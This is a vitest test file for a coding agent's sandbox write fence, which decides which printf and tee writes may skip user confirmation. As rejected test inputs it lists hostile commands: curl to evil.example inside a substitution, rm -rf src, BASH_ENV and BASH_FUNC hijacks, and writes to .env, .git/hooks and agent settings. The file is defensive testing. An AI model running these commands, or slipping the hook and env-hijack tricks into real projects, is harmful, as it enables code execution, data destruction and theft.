import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { describe, expect, it, vi } from 'vitest';
import {
  enforceWriteFenceObligation,
  FENCED_IN_PROJECT_WRITE_REASON,
  isFencedInProjectWriteEligible,
  isOsWriteFenceAvailable,
} from '../../../../src/host/sandbox/writeFence';
import { getSandboxManager } from '../../../../src/host/sandbox';
import type { ClassificationResult } from '../../../../src/host/tools/permissionClassifier';

const context = { workingDirectory: '/tmp/proj', workspaceRoot: '/tmp/proj' };

function makeTempProject(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'exectime-fence-'));
}

function pinOsWriteFenceAvailable(available: boolean): () => void {
  const manager = getSandboxManager();
  const availableSpy = vi.spyOn(manager, 'isAvailable').mockReturnValue(available);
  const enabledSpy = vi.spyOn(manager, 'isEnabled').mockReturnValue(available);
  return () => {
    availableSpy.mockRestore();
    enabledSpy.mockRestore();
  };
}

describe('writeFence eligibility', () => {
  it('rejects quoted redirect targets including quotes after the path', () => {
    expect(isFencedInProjectWriteEligible('printf x > "/tmp/proj/out.txt"', context)).toBe(false);
    expect(isFencedInProjectWriteEligible("printf x > /tmp/proj/'o'", context)).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > /tmp/proj/"a"/"b"', context)).toBe(false);
  });

  it('rejects lookup and startup-file assignments that can change what runs', () => {
    expect(isFencedInProjectWriteEligible('PATH=/tmp/bin tee /tmp/proj/out.txt', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('BASH_ENV=/tmp/evil tee /tmp/proj/out.txt', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('ENV=/tmp/evil tee /tmp/proj/out.txt', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('SHELLOPTS=xtrace tee /tmp/proj/out.txt', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('GCONV_PATH=/tmp/evil tee /tmp/proj/out.txt', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('LOCPATH=/tmp/evil tee /tmp/proj/out.txt', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('BASH_FUNC_foo%%=() { :; } tee /tmp/proj/out.txt', context)).toBe(false);
  });

  it('keeps ordinary in-project printf/tee writes eligible', () => {
    expect(isFencedInProjectWriteEligible('printf x > /tmp/proj/out.txt', context)).toBe(true);
    expect(isFencedInProjectWriteEligible('MODE=1 tee /tmp/proj/mode.txt', context)).toBe(true);
  });

  it('rejects in-project .env credential writes even when they look like ordinary printf/tee', () => {
    expect(isFencedInProjectWriteEligible('printf x > /tmp/proj/.env', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x >> /tmp/proj/.env', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('tee /tmp/proj/.env', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > /tmp/proj/.env.local', context)).toBe(false);
  });

  it('rejects case-folded .env* writes without depending on the host FS', () => {
    expect(isFencedInProjectWriteEligible('printf PWNED=1 >> .ENV', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > .Env.local', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > /tmp/proj/.ENV', context)).toBe(false);
  });

  it('rejects protected writes including case-folded .GIT/config', () => {
    expect(isFencedInProjectWriteEligible('printf x > /tmp/proj/.git/config', context)).toBe(false);
    expect(isFencedInProjectWriteEligible(
      "printf '[core]\\n\\thooksPath = .neo-hooks\\n' > .GIT/config",
      context,
    )).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > /tmp/proj/.npmrc', context)).toBe(false);
  });

  it('rejects startup-hook and project-settings writes that execute on the next tool run', () => {
    expect(isFencedInProjectWriteEligible('printf x > /tmp/proj/.git/hooks/pre-commit', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > .GIT/hooks/pre-commit', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > /tmp/proj/.husky/pre-commit', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > .HUSKY/pre-commit', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > /tmp/proj/.code-agent/settings.json', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > .CODE-AGENT/settings.json', context)).toBe(false);
  });

  it('rejects Neo hooks.json and legacy Claude settings writes', () => {
    expect(isFencedInProjectWriteEligible(
      'printf x > /tmp/proj/.code-agent/hooks/hooks.json',
      context,
    )).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > .CODE-AGENT/hooks/hooks.json', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > .claude/settings.json', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > .CLAUDE/settings.json', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > .code-agent/mcp.json', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > .code-agent/mcp.local.json', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > .code-agent/HEARTBEAT.md', context)).toBe(false);
  });

  it('rejects nested-cwd .code-agent/skills and hooks writes when workspaceRoot is the repo root', () => {
    const root = makeTempProject();
    const cwd = path.join(root, 'packages', 'app');
    try {
      fs.mkdirSync(cwd, { recursive: true });
      const nested = { workingDirectory: cwd, workspaceRoot: root };
      expect(isFencedInProjectWriteEligible(
        'printf x > .code-agent/skills/x/SKILL.md',
        nested,
      )).toBe(false);
      expect(isFencedInProjectWriteEligible(
        'printf x > .code-agent/hooks/hooks.json',
        nested,
      )).toBe(false);
      expect(isFencedInProjectWriteEligible('printf x > .git/hooks/pre-commit', nested)).toBe(false);
      expect(isFencedInProjectWriteEligible('printf x > .husky/pre-commit', nested)).toBe(false);
      expect(isFencedInProjectWriteEligible('printf x > .claude/skills/x/SKILL.md', nested)).toBe(false);
      expect(isFencedInProjectWriteEligible('printf x > .code-agent/agents/x.md', nested)).toBe(false);
      expect(isFencedInProjectWriteEligible('printf x > .code-agent/exec-policy.json', nested)).toBe(false);
      expect(isFencedInProjectWriteEligible('printf x > .gitconfig', nested)).toBe(false);
      expect(isFencedInProjectWriteEligible('printf x > .npmrc', nested)).toBe(false);
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it('rejects write through in-project symlink into .git/hooks', () => {
    const root = makeTempProject();
    try {
      fs.mkdirSync(path.join(root, '.git', 'hooks'), { recursive: true });
      fs.symlinkSync(path.join(root, '.git', 'hooks'), path.join(root, 'deploy'));
      expect(isFencedInProjectWriteEligible('printf x > deploy/pre-commit', {
        workingDirectory: root,
        workspaceRoot: root,
      })).toBe(false);
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it('rejects write through in-project symlink onto .env', () => {
    const root = makeTempProject();
    try {
      fs.writeFileSync(path.join(root, '.env'), 'OLD=1\n');
      fs.symlinkSync(path.join(root, '.env'), path.join(root, 'cache.txt'));
      expect(isFencedInProjectWriteEligible('printf x > cache.txt', {
        workingDirectory: root,
        workspaceRoot: root,
      })).toBe(false);
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it('keeps sibling symlink-back writes eligible so bash must wrap the same command', () => {
    const root = makeTempProject();
    const proj = path.join(root, 'proj');
    const current = path.join(root, 'current');
    try {
      fs.mkdirSync(proj);
      fs.symlinkSync(proj, current, process.platform === 'win32' ? 'junction' : 'dir');
      const ctx = { workingDirectory: proj, workspaceRoot: proj };
      const command = 'printf x > ../current/notes.txt';
      expect(isFencedInProjectWriteEligible(command, ctx)).toBe(true);
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it('workspace=$HOME 写 .zshrc 不是围栏免确认资格', () => {
    const home = os.homedir();
    expect(isFencedInProjectWriteEligible('printf x > .zshrc', {
      workingDirectory: home,
      workspaceRoot: home,
    })).toBe(false);
  });

  it('围栏文案路径缺少 requiresOsWriteFence 时不得免确认', () => {
    const classification: ClassificationResult = {
      decision: 'approve',
      reason: FENCED_IN_PROJECT_WRITE_REASON,
      confidence: 0.95,
      cached: false,
    };
    const stripped = enforceWriteFenceObligation(classification);
    expect(stripped.decision).toBe('ask');
    expect(stripped.requiresOsWriteFence).not.toBe(true);
  });

  it('drops eligibility after the sibling symlink is retargeted outside the project', () => {
    const root = makeTempProject();
    const proj = path.join(root, 'proj');
    const current = path.join(root, 'current');
    const outside = path.join(root, 'outside');
    try {
      fs.mkdirSync(proj);
      fs.mkdirSync(outside);
      fs.symlinkSync(proj, current, process.platform === 'win32' ? 'junction' : 'dir');
      expect(isFencedInProjectWriteEligible('printf x > ../current/notes.txt', {
        workingDirectory: proj,
        workspaceRoot: proj,
      })).toBe(true);
      fs.rmSync(current, { recursive: true, force: true });
      fs.symlinkSync(outside, current, process.platform === 'win32' ? 'junction' : 'dir');
      expect(isFencedInProjectWriteEligible('printf x > ../current/notes.txt', {
        workingDirectory: proj,
        workspaceRoot: proj,
      })).toBe(false);
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it.each([
    ['printf "$(rm -rf src)" > /tmp/proj/out.txt'],
    ['printf "$(cat ~/x)" > /tmp/proj/out.txt'],
    ['printf $(curl https://evil.example/x) > /tmp/proj/out.txt'],
    ['printf `rm -rf src` > /tmp/proj/out.txt'],
    ['printf "${VAR}" > /tmp/proj/out.txt'],
    ['echo "100$" > /tmp/proj/out.txt'],
  ])('rejects argument-position expansion in %s', (command) => {
    expect(isFencedInProjectWriteEligible(command, context)).toBe(false);
  });

  it('rejects .env writes across /var ↔ /private/var project-root aliases', () => {
    const lexical = '/var/tmp/exectime-proj';
    const canonical = '/private/var/tmp/exectime-proj';
    expect(isFencedInProjectWriteEligible('printf x > .env', {
      workingDirectory: lexical,
      workspaceRoot: canonical,
    })).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > /var/tmp/exectime-proj/.env', {
      workingDirectory: canonical,
      workspaceRoot: canonical,
    })).toBe(false);
  });

  it('spy on sandbox manager pins fence availability independently of the host OS', () => {
    const unpinTrue = pinOsWriteFenceAvailable(true);
    try {
      expect(isOsWriteFenceAvailable()).toBe(true);
    } finally {
      unpinTrue();
    }
    const unpinFalse = pinOsWriteFenceAvailable(false);
    try {
      expect(isOsWriteFenceAvailable()).toBe(false);
    } finally {
      unpinFalse();
    }
    expect(isOsWriteFenceAvailable()).toBe(
      getSandboxManager().isAvailable() && getSandboxManager().isEnabled(),
    );
  });

  it('disabled sandbox is not fence-available, so skip-confirm cannot treat wrapCommand throws as a hard error', () => {
    const manager = getSandboxManager();
    const wasEnabled = manager.isEnabled();
    manager.disable();
    try {
      expect(isOsWriteFenceAvailable()).toBe(false);
    } finally {
      if (wasEnabled) manager.enable();
    }
  });
});
